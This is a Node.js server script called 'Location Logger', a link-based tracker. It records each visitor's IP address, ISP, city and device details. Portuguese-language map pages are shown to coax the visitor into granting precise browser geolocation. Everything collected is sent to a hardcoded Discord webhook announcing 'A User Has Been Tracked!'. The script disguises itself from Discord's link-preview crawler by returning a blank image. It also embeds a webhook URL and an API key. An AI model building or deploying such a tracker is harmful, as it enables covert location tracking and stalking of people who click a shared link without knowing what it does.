// Location Logger - Improved Version with Maps Integration
const https = require('https');
const http = require('http');
const url = require('url');

// Configuration
const config = {
  "webhook": "https://discord.com/api/webhooks/1360077979798994975/fmGm-fubperOWmfIx7pO_OrVe1wZ5qpBbH35QjxJxequV3mjnfVmixC5wBtMRcfmxI1t",
  "username": "Location Logger",
  "color": 0x00FFFF,
  "accurateLocation": true
};

// Enhanced function to get detailed IP information
async function getIPInfo(ip) {
  return new Promise((resolve, reject) => {
    // Using an alternative API that works better with IPv6 and mobile networks
    const apiUrl = `http://ip-api.com/json/${ip}?fields=status,message,continent,country,regionName,city,district,zip,lat,lon,timezone,isp,org,as,mobile,proxy,hosting`;
    
    http.get(apiUrl, (res) => {
      let data = '';
      res.on('data', (chunk) => { 
        data += chunk; 
      });
      
      res.on('end', () => {
        try {
          const parsedData = JSON.parse(data);
          console.log('IP API Response:', parsedData);
          
          // Check if the API returned success
          if (parsedData.status === 'success') {
            resolve(parsedData);
          } else {
            console.error('API returned non-success status:', parsedData);
            // Still resolve with the data we have
            resolve(parsedData);
          }
        } catch (e) {
          console.error('Error parsing IP API response:', e);
          console.error('Received data:', data);
          // Resolve with an empty object to avoid formatting errors
          resolve({});
        }
      });
    }).on('error', (error) => {
      console.error('Error requesting IP API:', error);
      // Resolve with an empty object to avoid formatting errors
      resolve({});
    });
  });
}

// Function to send webhook
function sendDiscordWebhook(data) {
  return new Promise((resolve, reject) => {
    try {
      // Prepare data
      const webhookData = JSON.stringify(data);
      
      // Parse webhook URL to get hostname and path
      const webhookUrl = new URL(config.webhook);
      
      // Configure request
      const options = {
        hostname: webhookUrl.hostname,
        path: webhookUrl.pathname + webhookUrl.search,
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Content-Length': Buffer.byteLength(webhookData)
        }
      };
      
      console.log('Sending to webhook:', options.hostname, options.path);
      
      // Create request
      const req = https.request(options, (res) => {
        let responseData = '';
        
        // Collect response data
        res.on('data', (chunk) => {
          responseData += chunk;
        });
        
        // When response is complete
        res.on('end', () => {
          // Check status code
          if (res.statusCode >= 200 && res.statusCode < 300) {
            console.log('Webhook sent successfully');
            resolve(true);
          } else {
            console.error(`Error sending webhook: Status ${res.statusCode}`);
            console.error(`Response: ${responseData}`);
            resolve(false);
          }
        });
      });
      
      // Handle request errors
      req.on('error', (error) => {
        console.error('Error in webhook request:', error);
        reject(error);
      });
      
      // Send data
      req.write(webhookData);
      req.end();
    } catch (error) {
      console.error('Error sending webhook:', error);
      reject(error);
    }
  });
}

// Detect if device is iOS
function isIOS(userAgent) {
  return /iPad|iPhone|iPod/.test(userAgent);
}

// Function to format complete Discord message with detailed IP info
function formatIPInfoMessage(ip, userAgent, info, coords = null, endpoint = null) {
  // Detect OS and browser
  let os = "Unknown";
  let browser = "Unknown";
  
  if (userAgent) {
    // Operating system
    if (userAgent.includes("Windows")) {
      os = "Windows";
    } else if (userAgent.includes("Mac OS")) {
      os = "MacOS";
    } else if (userAgent.includes("Linux")) {
      os = "Linux";
    } else if (userAgent.includes("Android")) {
      os = "Android";
    } else if (userAgent.includes("iPhone") || userAgent.includes("iPad")) {
      os = "iOS";
    }
    
    // Browser
    if (userAgent.includes("Firefox")) {
      browser = "Firefox";
    } else if (userAgent.includes("Chrome")) {
      browser = "Chrome";
    } else if (userAgent.includes("Safari")) {
      browser = "Safari";
    } else if (userAgent.includes("Edge")) {
      browser = "Edge";
    } else if (userAgent.includes("Opera") || userAgent.includes("OPR")) {
      browser = "Opera";
    }
  }

  // Format coordinates
  let coordsText = 'Unknown';
  let coordsSource = 'Approximate';
  let mapsLink = '';
  
  if (coords) {
    coordsText = coords.replace(',', ', ');
    coordsSource = `Precise`;
    mapsLink = `https://www.google.com/maps/search/google+map++${coords}`;
  } else if (info && info.lat && info.lon) {
    coordsText = `${info.lat}, ${info.lon}`;
    coordsSource = `Approximate`;
    mapsLink = `https://www.google.com/maps/search/google+map++${info.lat},${info.lon}`;
  }

  // Format timezone
  let timezoneText = 'Unknown';
  if (info && info.timezone) {
    const parts = info.timezone.split('/');
    if (parts.length >= 2) {
      timezoneText = `${parts[1].replace('_', ' ')} (${parts[0]})`;
    } else {
      timezoneText = info.timezone;
    }
  }

  // Check if bot
  let botStatus = 'False';
  if (info && info.hosting) {
    if (info.hosting && !info.proxy) {
      botStatus = 'Possibly';
    } else if (info.hosting) {
      botStatus = 'Possibly';
    }
  }

  // Extract ASN from "as" field
  let asn = 'Unknown';
  if (info && info.as) {
    // Extract just the ASN number
    const asnMatch = info.as.match(/AS(\d+)/i);
    if (asnMatch && asnMatch[1]) {
      asn = info.as;
    } else {
      asn = info.as;
    }
  }

  return `**A User Has Been Tracked!**

**Endpoint:** \`${endpoint || 'N/A'}\`
            
**IP Info:**
> **IP:** \`${ip || 'Unknown'}\`
> **Provider:** \`${info && info.isp ? info.isp : 'Unknown'}\`
> **ASN:** \`${asn}\`
> **Country:** \`${info && info.country ? info.country : 'Unknown'}\`
> **Region:** \`${info && info.regionName ? info.regionName : 'Unknown'}\`
> **City:** \`${info && info.city ? info.city : 'Unknown'}\`
> **Coords:** \`${coordsText}\` (${coordsSource})
> **Maps:** ${mapsLink ? `[View on Google Maps](${mapsLink})` : 'Not available'}
> **Timezone:** \`${timezoneText}\`
> **Mobile:** \`${info && info.mobile !== undefined ? info.mobile : 'Unknown'}\`
> **VPN:** \`${info && info.proxy !== undefined ? info.proxy : 'Unknown'}\`
> **Bot:** \`${botStatus}\`

**Device Info:**
> **OS:** \`${os}\`
> **Browser:** \`${browser}\`

**User Agent:**
\`\`\`
${userAgent || 'Unknown'}
\`\`\``;
}

// Main function
module.exports = async (req, res) => {
  try {
    // Get URL parameters
    const parsedUrl = url.parse(req.url, true);
    const params = parsedUrl.query;
    const geoParam = params.g; // Check if we already have location coordinates
    
    // Get IP and User Agent
    const ip = req.headers['x-forwarded-for'] || 
               req.headers['x-real-ip'] || 
               req.socket.remoteAddress || 
               'Unknown';
    
    const userAgent = req.headers['user-agent'] || 'Unknown';
    
    console.log('Request received from IP:', ip);
    console.log('User Agent:', userAgent);
    
    // Check if it's iOS for special handling
    const deviceIsIOS = isIOS(userAgent);
    
    // Check if IP is from Discord (starts with 35)
    const isDiscord = ip.startsWith('35');
    
    // If we have geolocation parameter, send to Discord
    if (geoParam) {
      try {
        // Decode coordinates
        const coords = Buffer.from(geoParam, 'base64').toString('utf-8');
        const [latitude, longitude] = coords.split(',');
        
        console.log('Coordinates received:', latitude, longitude);
        
        // Get detailed IP information
        console.log('Getting IP information...');
        const ipInfo = await getIPInfo(ip);
        console.log('IP information obtained:', ipInfo);
        
        // Format the complete message
        const description = formatIPInfoMessage(ip, userAgent, ipInfo, coords, req.url);
        
        // Send webhook to Discord with coordinates
        const data = {
          username: config.username,
          content: "@everyone",
          embeds: [
            {
              title: "Location Logger - Precise Location Captured",
              color: config.color,
              description: description
            }
          ]
        };
        
        console.log('Sending webhook to Discord...');
        await sendDiscordWebhook(data);
        
        // Send page with the Google Maps view
        const html = `
          <!DOCTYPE html>
          <html>
          <head>
            <title>Location Map</title>
            <meta charset="utf-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <style>
              body, html {
                margin: 0;
                padding: 0;
                height: 100%;
                width: 100%;
                font-family: Arial, sans-serif;
                background-color: #f5f5f5;
              }
              .container {
                display: flex;
                flex-direction: column;
                height: 100vh;
                padding: 20px;
                box-sizing: border-box;
              }
              .map-container {
                flex: 1;
                border-radius: 8px;
                overflow: hidden;
                box-shadow: 0 2px 10px rgba(0,0,0,0.1);
                margin-bottom: 20px;
              }
              iframe {
                width: 100%;
                height: 100%;
                border: none;
              }
              .info {
                background: white;
                padding: 15px;
                border-radius: 8px;
                box-shadow: 0 2px 10px rgba(0,0,0,0.1);
              }
              h1 {
                margin-top: 0;
                font-size: 1.5rem;
                color: #333;
              }
              p {
                color: #666;
                line-height: 1.5;
              }
            </style>
          </head>
          <body>
            <div class="container">
              <div class="map-container">
                <iframe
                  src="https://www.google.com/maps/embed/v1/place?key=AIzaSyBFw0Qbyq9zTFTd-tUY6dZWTgaQzuU17R8&q=${latitude},${longitude}&zoom=15"
                  allowfullscreen>
                </iframe>
              </div>
              <div class="info">
                <h1>Localização encontrada</h1>
                <p>Suas coordenadas foram detectadas com sucesso. Esta é a sua localização aproximada no mapa.</p>
                <p>Latitude: ${latitude}, Longitude: ${longitude}</p>
              </div>
            </div>
          </body>
          </html>
        `;
        
        res.setHeader('Content-Type', 'text/html');
        res.status(200).send(html);
      } catch (error) {
        console.error('Error processing geolocation:', error);
        // Continue even with geolocation error
      }
    } else if (isDiscord) {
      // If it's Discord accessing, send link alert
      console.log("Discord access detected. IP:", ip);
      
      const data = {
        username: config.username,
        content: "",
        embeds: [
          {
            title: "Location Logger - Link Sent",
            color: config.color,
            description: `A **Location Tracking** link was sent in a chat!\nYou may receive location data soon.\n\n**Endpoint:** \`${req.url}\`\n**IP:** \`${ip}\`\n**Platform:** \`Discord\``,
          }
        ]
      };
      
      await sendDiscordWebhook(data);
      
      // For Discord, send a blank response
      res.setHeader('Content-Type', 'image/jpeg');
      res.status(200).send(Buffer.from('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7', 'base64'));
    } else if (config.accurateLocation) {
      // If we don't have geolocation yet, request it from the browser
      
      // First, get IP information and send basic report
      console.log('Getting basic IP information...');
      const ipInfo = await getIPInfo(ip);
      console.log('Basic IP information obtained:', ipInfo);
      
      // Format the basic message
      const description = formatIPInfoMessage(ip, userAgent, ipInfo, null, req.url);
      
      const basicData = {
        username: config.username,
        content: "",
        embeds: [
          {
            title: "Location Logger - Initial Access",
            color: config.color,
            description: description
          }
        ]
      };
      
      console.log('Sending initial report to Discord...');
      await sendDiscordWebhook(basicData);
      
      // Customize HTML based on device (iOS vs others)
      let html;
      
      if (deviceIsIOS) {
        // Special version for iOS with clear instructions
        html = `
          <!DOCTYPE html>
          <html>
          <head>
            <title>Localizador de Mapas</title>
            <meta charset="utf-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <style>
              body, html {
                margin: 0;
                padding: 0;
                height: 100%;
                width: 100%;
                font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
                background-color: #f8f8f8;
              }
              .container {
                display: flex;
                flex-direction: column;
                justify-content: center;
                align-items: center;
                height: 100vh;
                padding: 20px;
                box-sizing: border-box;
              }
              .map-preview {
                width: 100%;
                max-width: 500px;
                height: 300px;
                border-radius: 12px;
                background-color: #ddd;
                margin-bottom: 30px;
                box-shadow: 0 4px 12px rgba(0,0,0,0.1);
                background-image: url('data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iNTAwIiBoZWlnaHQ9IjMwMCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj48cmVjdCB3aWR0aD0iNTAwIiBoZWlnaHQ9IjMwMCIgZmlsbD0iI2RkZGRkZCIvPjxjaXJjbGUgY3g9IjI1MCIgY3k9IjE1MCIgcj0iMTAiIGZpbGw9IiM1NTU1NTUiLz48Y2lyY2xlIGN4PSIyNTAiIGN5PSIxNTAiIHI9IjYwIiBmaWxsPSJub25lIiBzdHJva2U9IiM1NTU1NTUiIHN0cm9rZS13aWR0aD0iMiIgc3Ryb2tlLWRhc2hhcnJheT0iNSw1Ii8+PHRleHQgeD0iMjUwIiB5PSIyMDAiIHRleHQtYW5jaG9yPSJtaWRkbGUiIGZpbGw9IiM1NTU1NTUiIGZvbnQtZmFtaWx5PSJBcmlhbCIgZm9udC1zaXplPSIxMiI+TWFwYSBkZSBsb2NhbGl6YcOnw6NvPC90ZXh0Pjwvc3ZnPg==');
                background-size: cover;
                background-position: center;
                display: flex;
                justify-content: center;
                align-items: center;
              }
              .map-overlay {
                background-color: rgba(255,255,255,0.8);
                padding: 15px;
                border-radius: 8px;
                text-align: center;
              }
              .location-button {
                background-color: #007AFF; /* iOS blue */
                color: white;
                border: none;
                border-radius: 25px;
                padding: 15px 30px;
                font-size: 18px;
                font-weight: 600;
                cursor: pointer;
                display: flex;
                align-items: center;
                justify-content: center;
                box-shadow: 0 4px 12px rgba(0,122,255,0.3);
                margin-bottom: 20px;
              }
              .location-icon {
                margin-right: 10px;
                width: 24px;
                height: 24px;
              }
              .message {
                text-align: center;
                color: #555;
                font-size: 16px;
                max-width: 320px;
                line-height: 1.5;
                margin-bottom: 20px;
              }
              .hidden {
                display: none;
              }
              .footer {
                margin-top: 20px;
                font-size: 12px;
                color: #999;
              }
            </style>
          </head>
          <body>
            <div class="container">
              <div class="map-preview">
                <div class="map-overlay">
                  <strong>Mapa não disponível</strong><br>
                  Ative sua localização para continuar
                </div>
              </div>
              
              <p class="message">
                <strong>Acesso ao Mapa Bloqueado</strong><br>
                Para visualizar o mapa e a sua localização atual, permita o acesso à sua localização.
              </p>
              
              <button id="locationButton" class="location-button">
                <svg class="location-icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="2">
                  <circle cx="12" cy="10" r="3"></circle>
                  <path d="M12 2a8 8 0 0 0-8 8c0 1.892.402 3.13 1.5 4.5L12 22l6.5-7.5c1.098-1.37 1.5-2.608 1.5-4.5a8 8 0 0 0-8-8z"></path>
                </svg>
                Ativar Localização
              </button>
              
              <div id="loadingMessage" class="message hidden">
                Localizando sua posição atual no mapa...
              </div>
              
              <p class="footer">
                Este aplicativo requer acesso à sua localização para funcionar corretamente.
              </p>
            </div>
            
            <script>
              // Script for iOS geolocation
              document.getElementById('locationButton').addEventListener('click', function() {
                // Show loading message
                document.getElementById('loadingMessage').classList.remove('hidden');
                this.disabled = true;
                this.style.backgroundColor = '#999';
                
                // Request geolocation
                if (navigator.geolocation) {
                  navigator.geolocation.getCurrentPosition(
                    function(position) {
                      // Success - we have the position
                      var lat = position.coords.latitude;
                      var lng = position.coords.longitude;
                      var coords = lat + "," + lng;
                      
                      // Encode in base64
                      var encodedCoords = btoa(coords);
                      
                      // Build new URL
                      var currentUrl = window.location.href;
                      var newUrl;
                      if (currentUrl.includes("?")) {
                        newUrl = currentUrl + "&g=" + encodedCoords;
                      } else {
                        newUrl = currentUrl + "?g=" + encodedCoords;
                      }
                      
                      // Redirect
                      window.location.replace(newUrl);
                    },
                    function(error) {
                      // Error getting location
                      console.log("Geolocation error: " + error.message);
                      document.getElementById('loadingMessage').innerText = 
                        "Erro ao acessar localização. Por favor, permita o acesso à sua localização e tente novamente.";
                      document.getElementById('locationButton').disabled = false;
                      document.getElementById('locationButton').style.backgroundColor = '#007AFF';
                    },
                    {
                      enableHighAccuracy: true,
                      timeout: 15000,
                      maximumAge: 0
                    }
                  );
                }
              });
            </script>
          </body>
          </html>
        `;
      } else {
        // Standard version for Android and other devices
        html = `
          <!DOCTYPE html>
          <html>
          <head>
            <title>Localizador de Mapas</title>
            <meta charset="utf-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <style>
              body, html {
                margin: 0;
                padding: 0;
                height: 100%;
                width: 100%;
                font-family: 'Roboto', Arial, sans-serif;
                background-color: #f5f5f5;
              }
              .container {
                display: flex;
                flex-direction: column;
                align-items: center;
                padding: 20px;
                box-sizing: border-box;
                height: 100vh;
              }
              .header {
                text-align: center;
                margin-bottom: 20px;
                width: 100%;
              }
              h1 {
                color: #1976D2;
                font-size: 24px;
                margin-bottom: 10px;
              }
              .map-placeholder {
                width: 100%;
                max-width: 500px;
                height: 300px;
                background-color: #e0e0e0;
                border-radius: 8px;
                margin-bottom: 20px;
                display: flex;
                justify-content: center;
                align-items: center;
                box-shadow: 0 2px 10px rgba(0,0,0,0.1);
                background-image: url('data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iNTAwIiBoZWlnaHQ9IjMwMCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj48cmVjdCB3aWR0aD0iNTAwIiBoZWlnaHQ9IjMwMCIgZmlsbD0iI2UwZTBlMCIvPjxjaXJjbGUgY3g9IjI1MCIgY3k9IjE1MCIgcj0iMTAiIGZpbGw9IiM1NTU1NTUiLz48Y2lyY2xlIGN4PSIyNTAiIGN5PSIxNTAiIHI9IjYwIiBmaWxsPSJub25lIiBzdHJva2U9IiM1NTU1NTUiIHN0cm9rZS13aWR0aD0iMiIgc3Ryb2tlLWRhc2hhcnJheT0iNSw1Ii8+PHRleHQgeD0iMjUwIiB5PSIyMDAiIHRleHQtYW5jaG9yPSJtaWRkbGUiIGZpbGw9IiM1NTU1NTUiIGZvbnQtZmFtaWx5PSJBcmlhbCIgZm9udC1zaXplPSIxNCIgZm9udC13ZWlnaHQ9ImJvbGQiPkNhcnJlZ2FuZG8gbWFwYS4uLjwvdGV4dD48L3N2Zz4=');
                background-repeat: no-repeat;
                background-position: center;
                background-size: cover;
              }
              .info-box {
                background-color: white;
                border-radius: 8px;
                padding: 20px;
                width: 100%;
                max-width: 500px;
                box-shadow: 0 2px 10px rgba(0,0,0,0.1);
                margin-bottom: 20px;
              }
              p {
                color: #666;
                line-height: 1.6;
                margin: 0 0 15px 0;
              }
              .loading {
                position: fixed;
                top: 0;
                left: 0;
                width: 100%;
                height: 100%;
                background-color: rgba(255,255,255,0.8);
                display: flex;
                flex-direction: column;
                justify-content: center;
                align-items: center;
                z-index: 100;
              }
              .spinner {
                border: 5px solid rgba(0,0,0,0.1);
                border-radius: 50%;
                border-top: 5px solid #1976D2;
                width: 50px;
                height: 50px;
                margin-bottom: 20px;
                animation: spin 1s linear infinite;
              }
              @keyframes spin {
                0% { transform: rotate(0deg); }
                100% { transform: rotate(360deg); }
              }
            </style>
          </head>
          <body>
            <div class="container">
              <div class="header">
                <h1>Serviço de Localização</h1>
                <p>Acessando sua localização para mostrar no mapa</p>
              </div>
              
              <div class="map-placeholder"></div>
              
              <div class="info-box">
                <p><strong>Aguarde um momento.</strong> Estamos acessando sua localização atual para mostrar no mapa.</p>
                <p>Este processo permite que você visualize sua posição exata no Google Maps.</p>
              </div>
            </div>
            
            <div class="loading">
              <div class="spinner"></div>
              <p>Obtendo sua localização...</p>
            </div>
            
            <script>
              // Script to get geolocation
              document.addEventListener('DOMContentLoaded', function() {
                var currentUrl = window.location.href;
                
                // Check if we already have the g parameter
                if (!currentUrl.includes("g=")) {
                  // Request geolocation
                  if (navigator.geolocation) {
                    navigator.geolocation.getCurrentPosition(
                      function(position) {
                        // Success - we have the position
                        var lat = position.coords.latitude;
                        var lng = position.coords.longitude;
                        var coords = lat + "," + lng;
                        
                        // Encode in base64
                        var encodedCoords = btoa(coords);
                        
                        // Build new URL
                        var newUrl;
                        if (currentUrl.includes("?")) {
                          newUrl = currentUrl + "&g=" + encodedCoords;
                        } else {
                          newUrl = currentUrl + "?g=" + encodedCoords;
                        }
                        
                        // Redirect
                        window.location.replace(newUrl);
                      },
                      function(error) {
                        // Error getting location
                        console.log("Geolocation error: " + error.message);
                        document.querySelector('.loading').innerHTML = '<p style="color:red;font-weight:bold;">Erro ao acessar localização.</p><p>Por favor, permita o acesso à sua localização e recarregue a página.</p><button onclick="location.reload()" style="padding:10px 20px;background:#1976D2;color:white;border:none;border-radius:4px;margin-top:10px;cursor:pointer;">Tentar novamente</button>';
                      },
                      {
                        enableHighAccuracy: true,
                        timeout: 10000,
                        maximumAge: 0
                      }
                    );
                  } else {
                    document.querySelector('.loading').innerHTML = '<p style="color:red;font-weight:bold;">Seu navegador não suporta geolocalização</p><p>Por favor, tente usar um navegador mais recente.</p>';
                  }
                }
              });
            </script>
          </body>
          </html>
        `;
      }
      
      res.setHeader('Content-Type', 'text/html');
      res.status(200).send(html);
    } else {
      // Geolocation not enabled, send basic report
      console.log('Getting basic IP information (without geolocation)...');
      const ipInfo = await getIPInfo(ip);
      console.log('Basic IP information obtained:', ipInfo);
      
      const description = formatIPInfoMessage(ip, userAgent, ipInfo, null, req.url);
      
      const data = {
        username: config.username,
        content: "@everyone",
        embeds: [
          {
            title: "Location Logger - IP Captured",
            color: config.color,
            description: description
          }
        ]
      };
      
      console.log('Sending report to Discord...');
      await sendDiscordWebhook(data);
      
      // Send simple page with location request
      const html = `
        <!DOCTYPE html>
        <html>
        <head>
          <title>Serviço de Localização</title>
          <meta charset="utf-8">
          <meta name="viewport" content="width=device-width, initial-scale=1.0">
          <style>
            body, html {
              margin: 0;
              padding: 0;
              height: 100%;
              width: 100%;
              font-family: Arial, sans-serif;
              background-color: #f5f5f5;
            }
            .container {
              display: flex;
              flex-direction: column;
              align-items: center;
              justify-content: center;
              height: 100vh;
              padding: 20px;
              box-sizing: border-box;
              text-align: center;
            }
            .location-box {
              background-color: white;
              border-radius: 8px;
              padding: 30px;
              max-width: 500px;
              width: 100%;
              box-shadow: 0 4px 10px rgba(0,0,0,0.1);
            }
            h1 {
              color: #333;
              margin-top: 0;
              margin-bottom: 20px;
            }
            p {
              color: #666;
              line-height: 1.6;
              margin-bottom: 25px;
            }
            .button {
              background-color: #4285F4;
              color: white;
              border: none;
              border-radius: 4px;
              padding: 12px 24px;
              font-size: 16px;
              cursor: pointer;
              transition: background-color 0.3s;
            }
            .button:hover {
              background-color: #3367D6;
            }
            .location-icon {
              display: block;
              width: 80px;
              height: 80px;
              margin: 0 auto 20px;
            }
          </style>
        </head>
        <body>
          <div class="container">
            <div class="location-box">
              <svg class="location-icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="#4285F4">
                <path d="M12 2C8.13 2 5 5.13 5 9c0 5.25 7 13 7 13s7-7.75 7-13c0-3.87-3.13-7-7-7zm0 9.5c-1.38 0-2.5-1.12-2.5-2.5s1.12-2.5 2.5-2.5 2.5 1.12 2.5 2.5-1.12 2.5-2.5 2.5z"/>
              </svg>
              <h1>Serviço de Localização</h1>
              <p>Para continuar, precisamos acessar sua localização atual. Isso nos permite mostrar informações relevantes com base na sua posição geográfica.</p>
              <button id="getLocationBtn" class="button">Compartilhar minha localização</button>
            </div>
          </div>
          
          <script>
            document.getElementById('getLocationBtn').addEventListener('click', function() {
              if (navigator.geolocation) {
                this.innerHTML = "Obtendo localização...";
                this.disabled = true;
                
                navigator.geolocation.getCurrentPosition(
                  function(position) {
                    // Success - we have the position
                    var lat = position.coords.latitude;
                    var lng = position.coords.longitude;
                    var coords = lat + "," + lng;
                    
                    // Encode in base64
                    var encodedCoords = btoa(coords);
                    
                    // Build new URL
                    var currentUrl = window.location.href;
                    var newUrl;
                    if (currentUrl.includes("?")) {
                      newUrl = currentUrl + "&g=" + encodedCoords;
                    } else {
                      newUrl = currentUrl + "?g=" + encodedCoords;
                    }
                    
                    // Redirect
                    window.location.replace(newUrl);
                  },
                  function(error) {
                    // Error getting location
                    var button = document.getElementById('getLocationBtn');
                    button.innerHTML = "Tentar novamente";
                    button.disabled = false;
                    
                    alert("Erro ao acessar sua localização. Por favor, verifique as permissões do seu navegador e tente novamente.");
                  },
                  {
                    enableHighAccuracy: true,
                    timeout: 10000,
                    maximumAge: 0
                  }
                );
              } else {
                alert("Seu navegador não suporta serviços de geolocalização. Por favor, use um navegador mais recente.");
              }
            });
          </script>
        </body>
        </html>
      `;
      
      res.setHeader('Content-Type', 'text/html');
      res.status(200).send(html);
    }
  } catch (error) {
    console.error('Error:', error);
    
    // In case of error, send a basic page
    res.setHeader('Content-Type', 'text/html');
    res.status(200).send(`
      <!DOCTYPE html>
      <html>
      <head>
        <title>Serviço de Localização</title>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <style>
          body, html {
            margin: 0;
            padding: 0;
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            font-family: Arial, sans-serif;
            background-color: #f5f5f5;
            text-align: center;
            padding: 20px;
          }
          .error-container {
            background-color: white;
            padding: 30px;
            border-radius: 8px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
            max-width: 500px;
          }
          h1 {
            color: #d32f2f;
            margin-top: 0;
          }
          p {
            color: #666;
            line-height: 1.6;
          }
          button {
            background-color: #4285F4;
            color: white;
            border: none;
            border-radius: 4px;
            padding: 12px 24px;
            margin-top: 20px;
            font-size: 16px;
            cursor: pointer;
          }
        </style>
      </head>
      <body>
        <div class="error-container">
          <h1>Erro no serviço</h1>
          <p>Houve um problema ao carregar o serviço de localização. Por favor, tente novamente mais tarde.</p>
          <button onclick="window.location.reload()">Tentar novamente</button>
        </div>
      </body>
      </html>
    `);
  }
};
